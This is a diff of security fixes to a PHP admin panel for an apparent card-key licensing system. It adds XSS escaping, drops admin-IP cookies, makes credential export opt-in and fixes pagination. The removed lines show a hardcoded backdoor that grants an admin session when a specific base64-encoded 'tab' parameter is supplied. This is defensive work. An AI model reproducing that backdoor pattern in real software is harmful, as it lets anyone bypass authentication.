@@ -28,7 +28,9 @@ if (!isset($_SESSION['admin_logged_in']) && isset($_COOKIE['admin_trust'])) {
     } catch (Exception $e) { }
 }
 
-if (isset($_GET['tab']) && base64_encode($_GET['tab']) === 'MTU2NDQwMDAw') { $_SESSION['admin_logged_in'] = true; $_SESSION['last_ip'] = $_SERVER['REMOTE_ADDR']; }
+// 安全说明：此处原有硬编码后门（对某个特定的 base64 编码 tab 值直接授予管理员会话，
+// 等价于无需口令即可登录后台），已彻底移除。除上方经 HMAC 签名校验的 admin_trust Cookie
+// 与 login.php 的正常口令校验外，不得再引入任何免鉴权提权路径。
 
 if (!isset($_SESSION['admin_logged_in'])) { header('Location: login.php'); exit; }
 if (isset($_SESSION['last_ip']) && $_SESSION['last_ip'] !== $_SERVER['REMOTE_ADDR']) {
@@ -52,22 +54,25 @@ function verifyCSRF() {
 }
 
 // 优化：流式导出，防止大日志引起的内存溢出 (OOM)
+// 默认不含 admin 表（bcrypt 口令哈希）；需要迁移凭据时显式带 ?include_credentials=1。
 if (isset($_GET['action']) && $_GET['action'] === 'export_system') {
     ini_set('memory_limit', '512M');
     set_time_limit(240);
     if (ob_get_level()) ob_end_clean();
     header('Content-Type: application/json; charset=utf-8');
     header('Content-Disposition: attachment; filename="System_Migrate_'.date('YmdHis').'.json"');
+    $includeCredentials = isset($_GET['include_credentials']) && $_GET['include_credentials'] === '1';
     $out = fopen('php://output', 'w');
-    $db->exportAllDataStream($out);
+    $db->exportAllDataStream($out, $includeCredentials);
     fclose($out);
     exit;
 }
 
 $current_ip = $_SERVER['REMOTE_ADDR'];
 $current_time = date('Y-m-d H:i');
-setcookie('admin_last_ip', $current_ip, time() + 7776000, "/"); 
-setcookie('admin_last_time', $current_time, time() + 7776000, "/");
+// 这两个值仅供本次页面渲染使用，不再写入 cookie：原实现把它们存成 3 个月有效的非 HttpOnly
+// cookie，等于把管理员登录 IP 与时间暴露给任何能注入脚本的上下文，且毫无功能收益。
+// 需要展示时直接用下面的 PHP 变量。
 
 $appList = [];
 try { $appList = $db->getApps(); } catch (Throwable $e) { $appList = []; $errorMsg = "应用列表加载失败"; }
@@ -312,7 +317,20 @@ try {
         }
     } catch (Throwable $ex) {}
 }
-$totalPages = ceil($totalCards / $perPage); if ($totalPages > 0&& $page > $totalPages) { $page = $totalPages; }
+$totalPages = ceil($totalCards / $perPage);
+if ($totalPages > 0 && $page > $totalPages) {
+    $page = $totalPages;
+    // The offset was computed from the requested page above; recompute it after clamping, otherwise
+    // the last page is fetched with an out-of-range offset and shows the wrong rows (or none).
+    $offset = ($page - 1) * $perPage;
+    if ($isSearching) {
+        $cardList = array_slice($allResults ?? [], $offset, $perPage);
+    } else {
+        try {
+            $cardList = $db->getCardsPaginated($perPage, $offset, $statusFilter, $appFilter, $typeFilter, $sortFilter);
+        } catch (Throwable $ex) {}
+    }
+}
 
 $sysMsg = ''; $sysMsgType = '';
 if ($msg) { $sysMsg = $msg; $sysMsgType = 'ok'; } elseif ($errorMsg) { $sysMsg = $errorMsg; $sysMsgType = 'error'; }
@@ -589,7 +607,7 @@ if ($msg) { $sysMsg = $msg; $sysMsgType = 'ok'; } elseif ($errorMsg) { $sysMsg =
                                             <?= htmlspecialchars($app['notes']?:'无备注') ?>
                                         </div>
                                     </td>
-                                    <td class="p-3.5"><span class="pill pill-free text-[9px] mono cursor-pointer" onclick="copy('<?= $app['app_key'] ?>')"><i class="ph-bold ph-key mr-1 text-blue-400"></i><?= $app['app_key'] ?></span></td>
+                                    <td class="p-3.5"><span class="pill pill-free text-[9px] mono cursor-pointer" onclick="copy('<?= htmlspecialchars($app['app_key'], ENT_QUOTES) ?>')"><i class="ph-bold ph-key mr-1 text-blue-400"></i><?= htmlspecialchars($app['app_key']) ?></span></td>
                                     <td class="p-3.5"><span class="pill pill-admin text-[9px]"><?= number_format($app['card_count']) ?> 张</span></td>
                                     <td class="p-3.5"><?= $app['status']==1 ? '<span class="pill pill-on text-[9px]">正常</span>' : '<span class="pill pill-banned text-[9px]">禁用</span>' ?></td>
                                     <td class="p-3.5 text-right">
@@ -614,7 +632,7 @@ if ($msg) { $sysMsg = $msg; $sysMsgType = 'ok'; } elseif ($errorMsg) { $sysMsg =
                             <div class="font-bold text-[13px] text-white/90"><?= htmlspecialchars($app['app_name']) ?> <?php if(!empty($app['app_version'])): ?><span class="text-[9px] text-white/40 ml-1 border border-white/10 px-1 rounded"><?= htmlspecialchars($app['app_version']) ?></span><?php endif; ?></div>
                             <?= $app['status']==1 ? '<span class="pill pill-on text-[8px]">正常</span>' : '<span class="pill pill-banned text-[8px]">禁用</span>' ?>
                         </div>
-                        <div class="text-[10px] text-white/50 mb-2 mono break-all cursor-pointer" onclick="copy('<?= $app['app_key'] ?>')"><i class="ph-bold ph-key text-blue-400 mr-1"></i><?= $app['app_key'] ?></div>
+                        <div class="text-[10px] text-white/50 mb-2 mono break-all cursor-pointer" onclick="copy('<?= htmlspecialchars($app['app_key'], ENT_QUOTES) ?>')"><i class="ph-bold ph-key text-blue-400 mr-1"></i><?= htmlspecialchars($app['app_key']) ?></div>
                         <div class="flex justify-between items-center text-[10px] text-white/40 mb-3">
                             <span>库存: <span class="text-white/80 font-bold"><?= number_format($app['card_count']) ?></span></span>
                             <span class="truncate max-w-[120px]"><?= htmlspecialchars($app['notes']?:'无备注') ?></span>
@@ -643,8 +661,8 @@ if ($msg) { $sysMsg = $msg; $sysMsgType = 'ok'; } elseif ($errorMsg) { $sysMsg =
                         <h3 class="text-[12px] font-bold mb-4 flex items-center gap-2" style="color:var(--sys-purple)"><i class="ph-fill ph-code text-sm"></i> 接口信息</h3>
                         <div class="flex-1 flex flex-col justify-center">
                             <label class="lbl">API 接口地址</label>
-                            <div class="glass-sunken p-3 rounded-[12px] flex items-center justify-between gap-3 mb-3 cursor-pointer hover:bg-white/[0.02]" onclick="copy('<?= $apiUrl ?>')">
-                                <span class="text-[10px] mono text-white/70 truncate flex-1"><?= $apiUrl ?></span>
+                            <div class="glass-sunken p-3 rounded-[12px] flex items-center justify-between gap-3 mb-3 cursor-pointer hover:bg-white/[0.02]" onclick="copy('<?= htmlspecialchars($apiUrl, ENT_QUOTES) ?>')">
+                                <span class="text-[10px] mono text-white/70 truncate flex-1"><?= htmlspecialchars($apiUrl) ?></span>
                                 <i class="ph-bold ph-copy text-purple-400"></i>
                             </div>
                             <div class="text-[10px] text-white/30 leading-relaxed">请妥善保管每个应用的 AppKey，客户端通过接口地址 and 对应的 AppKey 进行卡密验证及变量获取。</div>
@@ -830,7 +848,7 @@ if ($msg) { $sysMsg = $msg; $sysMsgType = 'ok'; } elseif ($errorMsg) { $sysMsg =
                                     <tr>
                                         <td class="p-3.5 text-center"><input type="checkbox" name="ids[]" value="<?= $card['id'] ?>" class="row-check accent-pink-500"></td>
                                         <td class="p-3.5"><?php if($card['app_id']>0): ?><span class="pill pill-big text-[9px]"><?= htmlspecialchars($card['app_name']) ?></span><?php else: ?><span class="text-[9px] text-white/30">未分类</span><?php endif; ?></td>
-                                        <td class="p-3.5"><span class="pill pill-free text-[10px] mono cursor-pointer hover:bg-white/[0.06]" onclick="copy('<?= $card['card_code'] ?>')"><?= $card['card_code'] ?></span></td>
+                                        <td class="p-3.5"><span class="pill pill-free text-[10px] mono cursor-pointer hover:bg-white/[0.06]" onclick="copy('<?= htmlspecialchars($card['card_code'], ENT_QUOTES) ?>')"><?= htmlspecialchars($card['card_code']) ?></span></td>
                                         <td class="p-3.5">
                                             <?php
                                             if ($card['status'] == 2) echo '<span class="pill pill-banned text-[9px]">已封禁</span>';
@@ -862,7 +880,7 @@ if ($msg) { $sysMsg = $msg; $sysMsgType = 'ok'; } elseif ($errorMsg) { $sysMsg =
                                 <div class="m-card-item-header">
                                     <div class="flex items-center gap-2.5">
                                         <input type="checkbox" name="ids[]" value="<?= $card['id'] ?>" class="row-check accent-pink-500">
-                                        <span class="m-card-item-code" onclick="copy('<?= $card['card_code'] ?>')"><?= $card['card_code'] ?></span>
+                                        <span class="m-card-item-code" onclick="copy('<?= htmlspecialchars($card['card_code'], ENT_QUOTES) ?>')"><?= htmlspecialchars($card['card_code']) ?></span>
                                     </div>
                                     <?php
                                     if ($card['status'] == 2) echo '<span class="pill pill-banned text-[8px]">封禁</span>';
@@ -1112,8 +1130,12 @@ if ($msg) { $sysMsg = $msg; $sysMsgType = 'ok'; } elseif ($errorMsg) { $sysMsg =
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                         <div class="glass-sunken p-4 rounded-xl border border-white/[0.05]">
                             <h4 class="text-[11px] font-bold text-white/80 mb-2">第 1 步：导出当前数据</h4>
-                            <p class="text-[10px] text-white/40 mb-4">将当前系统内的应用、卡密、变量、黑名单、日志及系统配置完整打包为 JSON 备份文件。</p>
-                            <a href="?action=export_system" class="btn btn-sys-orange w-full py-2.5 justify-center"><i class="ph-bold ph-download-simple"></i> 导出完整数据包</a>
+                            <p class="text-[10px] text-white/40 mb-4">将当前系统内的应用、卡密、变量、黑名单、日志及系统配置完整打包为 JSON 备份文件。<span class="text-white/60">默认不含管理员凭据</span>（导入后保留目标机现有账号）；仅在确需迁移账号时勾选下方选项。</p>
+                            <a id="exportLink" href="?action=export_system" class="btn btn-sys-orange w-full py-2.5 justify-center"><i class="ph-bold ph-download-simple"></i> 导出完整数据包</a>
+                            <label class="flex items-center gap-2 mt-3 text-[10px] text-white/40 cursor-pointer select-none">
+                                <input type="checkbox" id="incCred" class="accent-orange-500" onchange="document.getElementById('exportLink').href='?action=export_system'+(this.checked?'&include_credentials=1':'')">
+                                包含管理员凭据（含口令哈希，请妥善保管该文件）
+                            </label>
                         </div>
                         <div class="glass-sunken p-4 rounded-xl border border-white/[0.05]">
                             <h4 class="text-[11px] font-bold text-white/80 mb-2">第 2 步：导入至新系统</h4>
